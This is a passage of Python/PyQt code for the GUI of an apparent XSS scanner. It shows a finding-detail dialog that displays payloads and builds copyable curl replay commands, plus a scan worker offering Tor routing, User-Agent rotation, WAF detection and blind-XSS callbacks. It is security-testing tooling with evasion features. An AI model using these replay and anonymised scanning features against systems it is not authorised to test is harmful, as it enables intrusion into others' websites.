                "padding: 0 10px;"
                "letter-spacing: 1px;"
            )
            _fp_reason = (self.details.get("fp_reason")
                          or self.details.get("downgrade_reason") or "")
            if _fp_reason:
                fp_badge.setToolTip(str(_fp_reason))
            header_row.addWidget(fp_badge, 0)
        title = QLabel("Cross-Site Scripting (XSS)")
        title.setStyleSheet(
            f"color: {theme('fg_strong')};"
            "font-size: 17px;"
            "font-weight: bold;"
            "background: transparent;"
            "border: none;"
        )
        title.setAlignment(Qt.AlignVCenter)
        header_row.addWidget(title, 1)

        header_widget = QWidget()
        header_widget.setLayout(header_row)
        root.addWidget(header_widget)

        # ── Quick info line ── parametr · zdroj · status · WAF · gate · probe
        detail_bits = [f"parameter: {param}", f"source: {source}", f"status: {status}"]
        if waf:
            detail_bits.append(f"WAF: {waf}")
        # v2/v3 GATE annotace
        if gate_klass and not (ti or mxss):
            detail_bits.append(f"class: {gate_klass}")
        if render_probe and not (ti or mxss):
            probe_icon = {"executable": "✓", "inert": "✗", "skipped": "—"}.get(render_probe, "?")
            detail_bits.append(f"probe: {probe_icon} {render_probe}")
        if gate_renderability and gate_renderability != "html_rendered" and not (ti or mxss):
            detail_bits.append(f"render: {gate_renderability}")
        # v4 annotace
        if ti and isinstance(ti, dict):
            fw = ti.get("framework", "?")
            ver = ti.get("version", "")
            detail_bits.append(f"framework: {fw}{(' v'+ver) if ver else ''}")
            ctx_str = ti.get("expression_context", "")
            if ctx_str:
                detail_bits.append(f"expr_ctx: {ctx_str}")
        if mxss and isinstance(mxss, dict):
            detail_bits.append(f"sanitizer: {mxss.get('sanitizer','?')}")
            detail_bits.append(f"sinks: {mxss.get('innerhtml_sinks',0)}")
            detail_bits.append(f"risk: {mxss.get('risk_score',0):.2f}")
        # v6 DOM taint annotace
        if dom_v6 and isinstance(dom_v6, dict):
            detail_bits.append(f"dom-v6: {dom_v6.get('label','?')}")
            chain_n = dom_v6.get("chain_count", 0)
            if chain_n:
                detail_bits.append(f"chains: {chain_n}")
        # v7 static JS annotace
        if static_js and isinstance(static_js, dict):
            sjs_src = static_js.get("source", "?")
            sjs_snk = static_js.get("sink", "?")
            sjs_file = static_js.get("file", "")
            sjs_line = static_js.get("line", 0)
            file_short = sjs_file.split("/")[-1] if "/" in sjs_file else sjs_file
            detail_bits.append(f"js: {sjs_src}→{sjs_snk}")
            if file_short and sjs_line:
                detail_bits.append(f"@{file_short}:{sjs_line}")
        # v8 trusted types annotace
        if trusted_types and isinstance(trusted_types, dict):
            tt_kind = trusted_types.get("kind", "?")
            tt_sev = trusted_types.get("severity", "?")
            if tt_kind == "policy":
                pname = trusted_types.get("policy_name", "?")
                detail_bits.append(
                    f"tt: policy '{pname}'"
                    + ("  ⚠ DEFAULT" if trusted_types.get("is_default") else "")
                    + f" [{tt_sev}]"
                )
            else:
                detail_bits.append(f"tt: CSP misconfig [{tt_sev}]")

        # v9 stored round-trip annotace
        if stored_rt and isinstance(stored_rt, dict):
            origin_param = stored_rt.get("origin_param", "?")
            reflection_url = stored_rt.get("reflection_url", "")
            ref_short = reflection_url.split("/")[-1] if "/" in reflection_url else reflection_url
            ref_short = ref_short[:40] or reflection_url[-40:]
            is_admin = stored_rt.get("is_admin_context", False)
            detail_bits.append(
                f"stored: {origin_param} → /{ref_short}"
                + ("  ⚠ ADMIN" if is_admin else "")
            )

        # v10 proto pollution annotace
        if proto_pp and isinstance(proto_pp, dict):
            kind = proto_pp.get("kind", "?")
            sev = proto_pp.get("severity", "?")
            # v10.10: any CVE kind (cve-2024-47875, cve-2025-26791, cve-2026-41238)
            if kind.startswith("cve-"):
                dp_ver = proto_pp.get("dompurify_version", "?")
                cve_id = proto_pp.get("cve", kind.upper())
                detail_bits.append(
                    f"pp: {cve_id} + DOMPurify {dp_ver} ⚠ KNOWN CVE [{sev}]"
                )
            else:
                gad = proto_pp.get("gadget_property", "?")
                detail_bits.append(f"pp: {proto_pp.get('source_pattern', '?')} → {gad} [{sev}]")

        # v10.4 dom clobbering annotace
        dom_clob = self.details.get("dom_clobbering_finding")
        if dom_clob and isinstance(dom_clob, dict):
            sanitizer = dom_clob.get("sanitizer", "?")
            sink_recv = dom_clob.get("sink_receiver", "?")
            detail_bits.append(
                f"clobber: {sanitizer} sanitizer + window.{sink_recv} chain "
                f"⚠ INTIGRITI 2026"
            )

        # v10.5 SSR hydration annotace
        ssr_h_d = self.details.get("ssr_hydration_finding")
        if ssr_h_d and isinstance(ssr_h_d, dict):
            kind = ssr_h_d.get("kind", "?")
            cve = ssr_h_d.get("cve") or ""
            fw = ssr_h_d.get("framework") or ""
            ver = ssr_h_d.get("version") or ""
            if kind == "framework-cve" and cve:
                detail_bits.append(
                    f"ssr: {cve} ({fw} {ver}) ⚠ KNOWN CVE"
                )
            elif kind == "comment-break":
                detail_bits.append(f"ssr: comment-break ⚠ pre-hydration")
            elif kind == "script-break":
                detail_bits.append(f"ssr: script-break ⚠ JSON broke <script>")
            elif kind == "reflected-in-hydration":
                detail_bits.append(f"ssr: reflected in hydration JSON")

        # v10.6 CSP bypass annotace
        csp_b_d = self.details.get("csp_bypass_finding")
        if csp_b_d and isinstance(csp_b_d, dict):
            layer = csp_b_d.get("layer", "?")
            sev = csp_b_d.get("severity", "?")
            offending = (csp_b_d.get("offending_value") or "?")[:40]
            detail_bits.append(
                f"csp: {layer} [{sev}] {offending}"
            )

        # v5 headless verifier annotace (vars defined above in impact list build)
        if hv_verdict:
            if hv_executed:
                detail_bits.append(f"🚨 BROWSER: confirmed via {hv_method}")
            elif hv_verdict == "not_executed":
                detail_bits.append(f"browser: ✗ no exec")
            elif hv_verdict == "error":
                detail_bits.append(f"browser: ? error")
        detail_line = QLabel("  ·  ".join(detail_bits))
        detail_line.setTextFormat(Qt.PlainText)   # finding-derived text — never rich text
        detail_line.setStyleSheet(
            f"color: {theme('fg_muted')};"
            "font-size: 12px;"
            "background: transparent;"
            "border: none;"
            "padding: 0 2px 6px 2px;"
        )
        detail_line.setTextInteractionFlags(Qt.TextSelectableByMouse)
        root.addWidget(detail_line)

        # Separator
        sep1 = QFrame()
        sep1.setFrameShape(QFrame.HLine)
        sep1.setStyleSheet(f"background: {theme('card_sep')}; border: none; max-height: 1px;")
        root.addWidget(sep1)

        # ══════════════════════════════════════════════════════════════
        # 2. ÚTOČNÝ VEKTOR — URL + kontext
        # ══════════════════════════════════════════════════════════════
        root.addWidget(self._section_label("ATTACK VECTOR"))

        vec_widget = QWidget()
        vec_layout = QGridLayout(vec_widget)
        vec_layout.setSpacing(10)
        vec_layout.setContentsMargins(0, 4, 0, 4)

        # URL row
        vec_layout.addWidget(self._kv_label("URL"), 0, 0, alignment=Qt.AlignTop)
        url_text = QLabel(url)
        url_text.setTextFormat(Qt.PlainText)   # URL carries the reflected payload — no rich text / no <img> phone-home
        url_text.setWordWrap(True)
        url_text.setTextInteractionFlags(Qt.TextSelectableByMouse)
        url_text.setMinimumHeight(22)
        url_text.setStyleSheet(
            "color: #60a5fa;"
            "font-family: 'JetBrains Mono', monospace;"
            "font-size: 12px;"
            f"background: {theme('bg_card')};"
            f"border: 1px solid {theme('border')};"
            "border-radius: 3px;"
            "padding: 8px 10px;"
        )
        vec_layout.addWidget(url_text, 0, 1)

        # Context row
        vec_layout.addWidget(self._kv_label("context"), 1, 0, alignment=Qt.AlignTop)
        ctx_text = QLabel(context)
        ctx_text.setTextFormat(Qt.PlainText)   # finding-derived — never rich text
        ctx_text.setTextInteractionFlags(Qt.TextSelectableByMouse)
        ctx_text.setMinimumHeight(22)
        ctx_text.setStyleSheet(
            f"color: {theme('fg')};"
            "font-family: 'JetBrains Mono', monospace;"
            "font-size: 12px;"
            "font-weight: bold;"
            f"background: {theme('bg_card')};"
            f"border: 1px solid {theme('border')};"
            "border-radius: 3px;"
            "padding: 8px 10px;"
        )
        vec_layout.addWidget(ctx_text, 1, 1)

        # CSP row (optional)
        if csp:
            vec_layout.addWidget(self._kv_label("CSP"), 2, 0, alignment=Qt.AlignTop)
            csp_text = QLabel(csp)
            csp_text.setTextFormat(Qt.PlainText)   # server-supplied CSP header — never rich text
            csp_text.setWordWrap(True)
            csp_text.setTextInteractionFlags(Qt.TextSelectableByMouse)
            csp_text.setStyleSheet(
                f"color: {theme('fg_muted')};"
                "font-size: 11px;"
                "background: transparent;"
                "border: none;"
                "padding: 4px 2px;"
            )
            vec_layout.addWidget(csp_text, 2, 1)

        vec_layout.setColumnStretch(1, 1)
        root.addWidget(vec_widget)

        # ══════════════════════════════════════════════════════════════
        # 3. PAYLOAD — copy-ready blok
        # ══════════════════════════════════════════════════════════════
        root.addWidget(self._section_label("PAYLOAD"))

        self.payload_box = QPlainTextEdit()
        self.payload_box.setPlainText(payload if payload else "(payload was not recorded)")
        self.payload_box.setReadOnly(True)
        self.payload_box.setMinimumHeight(70)
        self.payload_box.setMaximumHeight(130)
        self.payload_box.setHorizontalScrollBarPolicy(Qt.ScrollBarAsNeeded)
        self.payload_box.setLineWrapMode(QPlainTextEdit.NoWrap)
        root.addWidget(self.payload_box)

        # ══════════════════════════════════════════════════════════════
        # 4. DOPADY — impact list
        # ══════════════════════════════════════════════════════════════
        root.addWidget(self._section_label("WHAT CAN AN ATTACKER DO?"))

        impact_widget = QWidget()
        impact_layout = QVBoxLayout(impact_widget)
        impact_layout.setSpacing(6)
        impact_layout.setContentsMargins(4, 4, 4, 4)

        for item in impact_list:
            row = QWidget()
            row_h = QHBoxLayout(row)
            row_h.setSpacing(10)
            row_h.setContentsMargins(0, 0, 0, 0)

            # Bullet
            bullet = QLabel("•")
            bullet.setStyleSheet(
                f"color: {sev_color};"
                f"font-size: 14px;"
                f"font-weight: bold;"
                f"background: transparent;"
                f"border: none;"
            )
            bullet.setFixedWidth(12)
            bullet.setAlignment(Qt.AlignTop)
            row_h.addWidget(bullet, 0, Qt.AlignTop)

            # Text — explicit minimum height podle obsahu
            txt = QLabel(item)
            txt.setTextFormat(Qt.PlainText)   # impact lines embed snippets/source-sink/payload — never rich text
            txt.setWordWrap(True)
            txt.setTextInteractionFlags(Qt.TextSelectableByMouse)
            txt.setStyleSheet(
                f"color: {theme('fg')};"
                "font-size: 12px;"
                "background: transparent;"
                "border: none;"
                "padding: 0;"
            )
            # Minimum height pro 1 řádek — zabrání oříznutí
            fm = txt.fontMetrics()
            txt.setMinimumHeight(fm.height() + 2)
            txt.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.MinimumExpanding)
            row_h.addWidget(txt, 1)

            impact_layout.addWidget(row)

        root.addWidget(impact_widget)

        # ══════════════════════════════════════════════════════════════
        # 5. REMEDIATION — text block
        # ══════════════════════════════════════════════════════════════
        root.addWidget(self._section_label("RECOMMENDED REPAIR"))

        rem_text = QLabel(remediation)
        rem_text.setTextFormat(Qt.PlainText)   # keep consistent — plain text only
        rem_text.setWordWrap(True)
        rem_text.setTextInteractionFlags(Qt.TextSelectableByMouse)
        rem_text.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.MinimumExpanding)
        # Minimum height podle textu (aby se nic neořezalo)
        fm = rem_text.fontMetrics()
        min_lines = max(2, len(remediation) // 70)
        rem_text.setMinimumHeight(fm.height() * min_lines + 20)
        rem_text.setStyleSheet(
            f"color: {theme('fg')};"
            "font-size: 12px;"
            f"background: {theme('bg_card')};"
            f"border: 1px solid {theme('border')};"
            "border-radius: 3px;"
            "padding: 12px 14px;"
            "line-height: 1.5;"
        )
        root.addWidget(rem_text)

        root.addStretch()

        # ══════════════════════════════════════════════════════════════
        # 6. FOOTER — mimo scroll area, fixed position
        # ══════════════════════════════════════════════════════════════
        footer_bar = QFrame()
        footer_bar.setStyleSheet(
            "QFrame {"
            f"  background: {theme('bg_deep')};"
            f"  border-top: 1px solid {theme('border')};"
            "}"
        )
        footer_layout = QHBoxLayout(footer_bar)
        footer_layout.setSpacing(8)
        footer_layout.setContentsMargins(18, 12, 18, 12)

        btn_copy_payload = QPushButton("Copy payload")
        btn_copy_payload.clicked.connect(lambda: self._copy_to_clipboard(payload, "Payload"))
        footer_layout.addWidget(btn_copy_payload)

        btn_copy_url = QPushButton("Copy URL")
        btn_copy_url.clicked.connect(lambda: self._copy_to_clipboard(url, "URL"))
        footer_layout.addWidget(btn_copy_url)

        curl_cmd = self._build_curl_command(url, param, payload, source)
        btn_copy_curl = QPushButton("Copy curl")
        btn_copy_curl.clicked.connect(lambda: self._copy_to_clipboard(curl_cmd, "curl command"))
        footer_layout.addWidget(btn_copy_curl)

        footer_layout.addStretch()

        btn_close = QPushButton("Close")
        btn_close.setObjectName("primaryBtn")
        btn_close.clicked.connect(self.accept)
        footer_layout.addWidget(btn_close)

        outer.addWidget(footer_bar, 0)

    # ── Helpers ──────────────────────────────────────────────────────

    def _section_label(self, text: str) -> QLabel:
        """Section header — minimalist white text with a border-bottom."""
        lbl = QLabel(text)
        lbl.setStyleSheet(
            f"color: {theme('fg_muted')};"
            "font-size: 10px;"
            "font-weight: bold;"
            "letter-spacing: 2px;"
            "background: transparent;"
            "border: none;"
            "padding: 10px 0 2px 0;"
        )
        return lbl

    def _kv_label(self, text: str) -> QLabel:
        """Left column label — uppercase, subtle."""
        lbl = QLabel(text.upper())
        lbl.setMinimumWidth(70)
        lbl.setMaximumWidth(80)
        lbl.setStyleSheet(
            f"color: {theme('fg_muted')};"
            "font-size: 10px;"
            "font-weight: bold;"
            "letter-spacing: 1px;"
            "background: transparent;"
            "border: none;"
            "padding: 10px 0 0 0;"
        )
        return lbl

    @staticmethod
    def _hex_to_rgba(hex_color: str, alpha: float) -> str:
        """Convert '#ff2d55' + alpha 0.13 → '(255, 45, 85, 0.13)'."""
        h = hex_color.lstrip('#')
        if len(h) == 3:
            h = ''.join(c * 2 for c in h)
        try:
            r = int(h[0:2], 16)
            g = int(h[2:4], 16)
            b = int(h[4:6], 16)
            return f"({r}, {g}, {b}, {alpha})"
        except Exception:
            return "(255, 255, 255, 0.1)"

    def _copy_to_clipboard(self, text: str, label: str):
        if not text:
            return
        QGuiApplication.clipboard().setText(text)
        if self.parent() and hasattr(self.parent(), 'sb'):
            self.parent().sb.showMessage(f"{label} copied to clipboard", 2500)

    def _build_curl_command(self, url: str, param: str, payload: str, source: str) -> str:
        """Build a curl one-liner to replay the vulnerability in a terminal / Burp."""
        if not url:
            return ""
        # Escape single quotes in the payload
        pl_escaped = payload.replace("'", "'\\''")

        if source == "json":
            # JSON POST
            return (f"curl -k -X POST '{url}' \\\n"
                    f"    -H 'Content-Type: application/json' \\\n"
                    f"    -d '{{\"{param}\": \"{pl_escaped}\"}}'")
        elif source == "post":
            # form-urlencoded POST
            return (f"curl -k -X POST '{url}' \\\n"
                    f"    --data-urlencode '{param}={pl_escaped}'")
        elif source == "header":
            # HTTP header injection
            return (f"curl -k '{url}' \\\n"
                    f"    -H '{param}: {pl_escaped}'")
        else:
            # GET s query parametrem (výchozí — seed/fuzz/dom)
            # URL už pravděpodobně obsahuje parametr, ale přepíšeme ho pro jistotu
            from urllib.parse import urlparse as _up, urlencode, parse_qsl, urlunparse
            try:
                parsed = _up(url)
                q = dict(parse_qsl(parsed.query, keep_blank_values=True))
                q[param] = payload
                new_url = urlunparse(parsed._replace(query=urlencode(q)))
                return f"curl -k '{new_url}'"
            except Exception:
                return f"curl -k '{url}'"


# ══════════════════════════════════════════════════════════════════════
# SCAN WORKER
# ══════════════════════════════════════════════════════════════════════


def _derive_checkpoint_path(target: str) -> str:
    """v10.16: Odvodí cestu checkpoint souboru z targetu, ať uživatel nemusí
    ručně zadávat cestu. Sanitizuje host+path do bezpečného názvu vedle
    pracovního adresáře. Modul-level (volá ScanWorker i GUI)."""
    import re as _re
    from urllib.parse import urlparse as _up
    try:
        u = _up(target if "://" in target else "https://" + target)
        base = (u.hostname or "scan") + (u.path or "").rstrip("/").replace("/", "_")
    except Exception:
        base = "scan"
    safe = _re.sub(r"[^A-Za-z0-9._-]", "_", base)[:80] or "scan"
    return f"xssgrenade_{safe}.ckpt"


class ScanWorker(QThread):
    sig_log            = pyqtSignal(str, str)
    sig_csp            = pyqtSignal(object)
    sig_hit            = pyqtSignal(dict)
    sig_waf            = pyqtSignal(dict)
    sig_crawl_progress = pyqtSignal(dict)
    sig_crawl_done     = pyqtSignal(dict)
    sig_progress       = pyqtSignal(int, int)
    sig_phase          = pyqtSignal(str, dict)
    sig_finished       = pyqtSignal(list, float)
    sig_error          = pyqtSignal(str)

    def __init__(self, config):
        super().__init__()
        self.config  = config
        import threading
        self.cancel_event = threading.Event()
        self.hit_q = _queue.Queue()
        self.waf_q = _queue.Queue()

    def stop(self):
        self.cancel_event.set()
        
    def run(self):
        try:
            self._execute()
        except Exception as e:
            # A crash inside run_scan() used to surface as a bare str(e) with the
            # traceback thrown away — leaving a detection crash undiagnosable
            # ("the scan just finished"). Persist the FULL traceback to a crash
            # log next to the script and emit a typed message so the phase/line
            # is recoverable after the fact.
            import traceback
            tb = traceback.format_exc()
            try:
                _crash_path = os.path.join(
                    os.path.dirname(os.path.abspath(__file__)), "xss_crash.log")
                with open(_crash_path, "a", encoding="utf-8") as _cf:
                    _cf.write(f"\n===== SCAN CRASH {time.time():.0f} =====\n")
                    _cf.write(f"target={getattr(self, 'config', {}).get('target', '?')}\n")
                    _cf.write(tb)
                    _cf.write("\n")
            except Exception:
                _crash_path = "(crash log unavailable)"
            self.sig_error.emit(
                f"{type(e).__name__}: {e}  —  full traceback → {_crash_path}")

    def _execute(self):
        import importlib.util, warnings
        warnings.filterwarnings("ignore", category=UserWarning, module="bs4")

        here     = os.path.dirname(os.path.abspath(__file__))
        mod_path = os.path.join(here, "xss_grenade.py")
        if not os.path.exists(mod_path):
            self.sig_error.emit(f"xss_grenade.py not find: {here}"); return

        spec = importlib.util.spec_from_file_location("xss_grenade", mod_path)
        mod  = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
        # Uložit modul referenci, aby _phase("done") mohl získat get_emit_stats
        # bez znovu-importu (rychlejší + zachovává state).
        self._xg_module = mod

        cfg       = self.config
        t0        = time.time()
        def safe_hit(d):
            try:
                # Bezpečný stringify všech polí. Včetně nových pole z v3
                # _emit_hit chokepoint: gate_klass, gate_severity, render_probe,
                # gate_renderability, gate_content_type, dom_verified, gate_verdict.
                safe = {
                    "url":      str(d.get("url", "")),
                    "param":    str(d.get("param", "")),
                    "context":  str(d.get("context", "")),
                    "csp_note": str(d.get("csp_note", "")),
                    "status":   str(d.get("status", "")),
                    "source":   str(d.get("source", "seed")),
                    "payload":  str(d.get("payload", "")),
                    "waf":      str(d.get("waf", {}).get("name", "")) if isinstance(d.get("waf"), dict) else str(d.get("waf", "")),
                    # ── v2 GATE annotations (nullable strings) ──
                    "gate_klass":         (str(d.get("gate_klass"))
                                           if d.get("gate_klass") is not None else ""),
                    "gate_severity":      (str(d.get("gate_severity"))
                                           if d.get("gate_severity") is not None else ""),
                    "gate_renderability": (str(d.get("gate_renderability"))
                                           if d.get("gate_renderability") is not None else ""),
                    "gate_content_type":  (str(d.get("gate_content_type"))
                                           if d.get("gate_content_type") is not None else ""),
                    # ── v3 active render probe ──
                    "render_probe":       (str(d.get("render_probe"))
                                           if d.get("render_probe") is not None else ""),
                    "render_probe_reason":(str(d.get("render_probe_reason"))
                                           if d.get("render_probe_reason") is not None else ""),
                    # ── DOM verification flag ──
                    "dom_verified":       bool(d.get("dom_verified", False)),
                    # ── full verdict dict (kept as-is for detail dialog) ──
                    "gate_verdict":       d.get("gate_verdict"),
                    # ── v4: template injection + mutation XSS findings ──
                    # Each is a dict (or None). Detail dialog renders them
                    # if present.
                    "template_injection": d.get("template_injection"),
                    "mxss_finding":       d.get("mxss_finding"),
                    # ── v5: headless DOM verifier verdict ──
                    "headless_verdict":   (str(d.get("headless_verdict"))
                                           if d.get("headless_verdict") is not None else ""),
                    "headless_executed":  bool(d.get("headless_executed", False)),
                    "headless_method":    (str(d.get("headless_method"))
                                           if d.get("headless_method") is not None else ""),
                    "headless_evidence":  (str(d.get("headless_evidence"))
                                           if d.get("headless_evidence") is not None else ""),
                    # ── v6: DOM taint analysis ──
                    # Set when source="dom-v6" — runtime source→sink chain
                    # detected by Playwright with injected hooks.
                    "dom_v6_finding":     d.get("dom_v6_finding"),
                    # ── v7: Static JS analyzer ──
                    # Set when source="static-js" — AST taint flow detected
                    # in inline <script> or external .js file (esprima).
                    "static_js_finding":  d.get("static_js_finding"),
                    # ── v8: Trusted Types analyzer ──
                    # Set when source="trusted-types" — CSP misconfig or
                    # insecure createPolicy() definition found in JS.
                    "trusted_types_finding": d.get("trusted_types_finding"),
                    # ── v9: Stored XSS round-trip ──
                    # Set when source="stored-roundtrip" — multi-canary stored
                    # XSS detected via re-crawl phase.
                    "stored_roundtrip_finding": d.get("stored_roundtrip_finding"),
                    # ── v10: Prototype Pollution → XSS chain ──
                    # Set when source="proto-pollution" — PP source+gadget chain
                    # or PP source + vulnerable DOMPurify (CVE-2026-41238).
                    "proto_pollution_finding": d.get("proto_pollution_finding"),
                    # ── v10.4: DOM Clobbering → XSS chain ──
                    # Set when source="dom-clobbering" — sanitizer issue +
                    # clobberable sink in same page (Intigriti 2026 pattern).
                    "dom_clobbering_finding": d.get("dom_clobbering_finding"),
                    # ── v10.5: SSR Hydration XSS (CVE-2026-27902) ──
                    # Set when source="ssr-hydration" — framework-cve, comment-break,
                    # script-break, or reflected-in-hydration finding.
                    "ssr_hydration_finding": d.get("ssr_hydration_finding"),
                    # ── v10.6: CSP Bypass Detection (94.72% bypassable) ──
                    # Set when source="csp-bypass" — whitelist-jsonp, unsafe-directive,
                    # nonce-reuse, meta-tag-csp, wildcard-host, or css-injection finding.
                    "csp_bypass_finding": d.get("csp_bypass_finding"),
                }
                self.hit_q.put_nowait(safe)
                # Debug: zápis do souboru (sig_log z ThreadPoolExecutor nefunguje).
                # JEN když je XSSG_DEBUG_GUI=1 — jinak soubor rostl i s debugem OFF
                # (self._dbg jde do devnull, ale tenhle přímý open ho obcházel).
                import os as _os
                if _os.environ.get("XSSG_DEBUG_GUI") == "1":
                    _dbg_path = _os.path.join(_os.path.dirname(_os.path.abspath(__file__)), "xss_debug_gui.log")
                    with open(_dbg_path, "a", encoding="utf-8") as _f:
                        _f.write(f"{time.time():.3f} [SAFE_HIT] url={safe.get('url','')[:80]} "
                                 f"klass={safe.get('gate_klass','')} probe={safe.get('render_probe','')} "
                                 f"qsize={self.hit_q.qsize()}\n")
            except Exception as e:
                self.sig_log.emit(f"[HIT-ERR] {e}", "error")

        def safe_waf(d):
            try:
                self.waf_q.put_nowait({k: str(v) for k, v in d.items()})
                import os as _os
                if _os.environ.get("XSSG_DEBUG_GUI") == "1":
                    _dbg_path = _os.path.join(_os.path.dirname(_os.path.abspath(__file__)), "xss_debug_gui.log")
                    with open(_dbg_path, "a", encoding="utf-8") as _f:
                        _f.write(f"{time.time():.3f} [SAFE_WAF] name={d.get('name','')} qsize={self.waf_q.qsize()}\n")
            except Exception as e:
                self.sig_log.emit(f"[WAF-ERR] {e}", "error")

        callbacks = mod.make_callbacks(
            on_log             = lambda m, l: self.sig_log.emit(str(m), str(l)),
            on_csp             = lambda r:    self.sig_csp.emit(r),
            on_hit             = safe_hit,
            on_waf             = safe_waf,
            on_crawler_progress= lambda d:    self.sig_crawl_progress.emit(d),
            on_crawler_done    = lambda d:    self.sig_crawl_done.emit(d),
            on_progress        = lambda c, t: self.sig_progress.emit(c, t),
            on_phase           = lambda p, d: self.sig_phase.emit(p, d),
        )

        # ── Tor inicializace (pokud je aktivní) ─────────────────────────
        proxies = None
        if cfg.get("tor_enabled"):
            self.sig_log.emit("Inicializuji Tor controller...", "info")
            tor = mod.init_tor_controller(
                control_port=cfg.get("tor_control_port", 9051),
                socks_port=cfg.get("tor_socks_port", 9050),
                password=cfg.get("tor_password"),
            )
            if tor is None:
                self.sig_log.emit(
                    "[ERR] Tor init failed. Check: (1) the daemon is running, "
                    "(2) ControlPort in torrc, (3) --tor-password if one is set, "
                    "(4) pip install stem",
                    "error",
                )
                self.sig_error.emit("Tor initialization failed — scan cancelled")
                return
            self.sig_log.emit(
                f"[OK] Tor controller OK. Verifying exit IP via check.torproject.org...",
                "info",
            )
            ip = tor.verify_exit_ip()
            if ip:
                self.sig_log.emit(f"[OK] Tor active — exit IP: {ip}", "info")
            else:
                self.sig_log.emit(
                    "[ERR] check.torproject.org did not confirm Tor routing — scan cancelled",
                    "error",
                )
                self.sig_error.emit("Tor SOCKS not working")
                return
            # Tor SOCKS5 proxy override (we ignore the manual proxy field when --tor)
            proxies = tor.requests_proxies()
        else:
            # Standard proxy (if the user entered a manual proxy)
            pv = cfg.get("proxy", "").strip()
            if pv:
                proxies = {"http": pv, "https": pv}

        # ── UA rotator initialization (if rotate_ua or tor) ──────────
        if cfg.get("rotate_ua") or cfg.get("tor_enabled"):
            # v10.58: honour --ua-file (custom pool), --no-ua-fresh (offline pool)
            # + --target-country (Accept-Language / Tor exit) exactly like the CLI.
            _fresh = cfg.get("ua_fresh", True)
            _ua_file = cfg.get("ua_file")
            if _ua_file:
                mod.get_ua_rotator(
                    ua_file=_ua_file,
                    rotate_every=cfg.get("ua_rotate_every", 5),
                    target_country=cfg.get("target_country"),
                )
                _ua_mode = f"file={_ua_file}"
            else:
                mod.get_ua_rotator(
                    None if _fresh else mod.DEFAULT_USER_AGENTS,
                    rotate_every=cfg.get("ua_rotate_every", 5),
                    fresh=_fresh,
                    target_country=cfg.get("target_country"),
                )
                _ua_mode = "live fresh" if _fresh else "offline"
            self.sig_log.emit(
                f"UA rotation active (every {cfg.get('ua_rotate_every', 5)} req, "
                f"{_ua_mode}"
                f"{', country=' + cfg['target_country'] if cfg.get('target_country') else ''})",
                "info",
            )

        results = mod.run_scan(
            target=cfg["target"], payloads=cfg["payloads"],
            workers=cfg["workers"], timeout=cfg["timeout"],
            sleep_between=cfg["sleep"], verify_ssl=cfg["verify_ssl"],
            limit_urls=cfg.get("limit_urls") or None, limit_payloads=None,
            early_exit=False, canary=cfg["canary"], marker_enabled=cfg["marker"],
            marker_param="_", verbose=cfg["verbose"],
            report_path=(Path(cfg.get("report_path", "xss_report.txt"))
                         if cfg.get("txt_report") else None),
            json_report=(Path(cfg.get("json_report", "xss_report.json"))
                         if cfg.get("json_report_enabled") else None),
            rotate_ua=cfg["rotate_ua"], user_agents=cfg["user_agents"],
            proxies=proxies,   # Tor SOCKS5 nebo ruční proxy nebo None
            follow_redirects=cfg["follow_redirects"],
            crawl_depth=cfg["crawl_depth"], crawl_delay=0.1,
            crawl_max_pages=cfg["crawl_max_pages"],
            enable_fuzz=cfg["fuzz"], enable_post_scan=cfg["post"],
            enable_json_scan=cfg["json_scan"], enable_header_scan=cfg["headers"],
            enable_path_scan=cfg.get("path_scan", False),
            enable_cookie_scan=cfg.get("cookie_scan", False),
            # v10.16: resume/checkpoint — když zapnuto, odvoď cestu z targetu
            # (vedle pracovního adresáře), ať uživatel nemusí spravovat cesty.
            checkpoint_path=(
                _derive_checkpoint_path(cfg.get("target", ""))
                if cfg.get("resume") else None),
            resume=cfg.get("resume", False),
            # v10.16: HTML report — odvoď cestu z JSON report cesty (jen jako
            # název souboru, .html příponou). Funguje i když je JSON report
            # vypnutý — bereme jen textovou cestu z pole, ne stav checkboxu.
            html_report=(
                str(Path(cfg.get("json_report", "xss_report.json")).with_suffix(".html"))
                if cfg.get("html_report") else None),
            enable_jsonp_scan=cfg.get("jsonp", False),
            enable_dangling_scan=cfg.get("dangling", False),
            enable_svg_scan=cfg.get("svg", False),
            enable_graphql_scan=cfg.get("graphql", False),
            enable_markdown_scan=cfg.get("markdown", False),
            enable_css_scan=cfg.get("css", False),
            enable_htmx_alpine_scan=cfg.get("htmx_alpine", False),
            enable_dompurify_config_scan=cfg.get("dompurify_config", False),
            enable_cache_poisoning_scan=cfg.get("cache_poisoning", False),
            # ── v10.58: CLI parity — reports/evidence paths auto-derived from the
            # JSON report path (base + .sarif / .poc.html / .evidence.jsonl) ──
            sarif_report=(
                str(Path(cfg.get("json_report", "xss_report.json")).with_suffix("")) + ".sarif"
                if cfg.get("sarif") else None),
            poc_report=(
                str(Path(cfg.get("json_report", "xss_report.json")).with_suffix("")) + ".poc.html"
                if cfg.get("poc") else None),
            evidence_store_path=(
                str(Path(cfg.get("json_report", "xss_report.json")).with_suffix("")) + ".evidence.jsonl"
                if cfg.get("evidence") else None),
            evidence_origin=cfg.get("evidence_origin", "public"),
            evidence_retention_days=cfg.get("evidence_retention_days"),
            cors_scan_enabled=cfg.get("cors_scan_enabled", True),
            crlf_scan_enabled=cfg.get("crlf_scan_enabled", True),
            xssi_scan_enabled=cfg.get("xssi_scan_enabled", True),
            legacy_tls=cfg.get("legacy_tls", False),
            warmup_origin=cfg.get("warmup_origin", True),
            scan_intensity=cfg.get("scan_intensity"),
            cffi_impersonate=cfg.get("cffi_impersonate"),
            dom_wait=cfg.get("dom_wait", 2.0),
            dom_budget_secs=cfg.get("dom_budget_secs", 45),
            stored_verify_urls=cfg.get("stored_verify_urls"),
            dom_dynamic=cfg["dom"], callbacks=callbacks,
            fuzz_topn=cfg.get("fuzz_topn", 3),
            fuzz_batch=cfg.get("fuzz_batch", 16),
            fuzz_iters=cfg.get("fuzz_iters", 200),
            fuzz_budget_secs=cfg.get("fuzz_budget_secs", 60),
            fuzz_ctx_probe=cfg.get("fuzz_ctx_probe", True),
            enable_context_scan=cfg.get("context_scan", True),
            enable_stored_scan=cfg.get("stored_scan", False),
            stored_wait_secs=cfg.get("stored_wait_secs", 1.0),
            enable_blind_xss=cfg.get("blind_xss", False),
            blind_oob_url=cfg.get("blind_oob_url") or None,
            enable_postmessage_scan=cfg.get("postmessage_scan", False),
            enable_websocket_scan=cfg.get("websocket_scan", False),
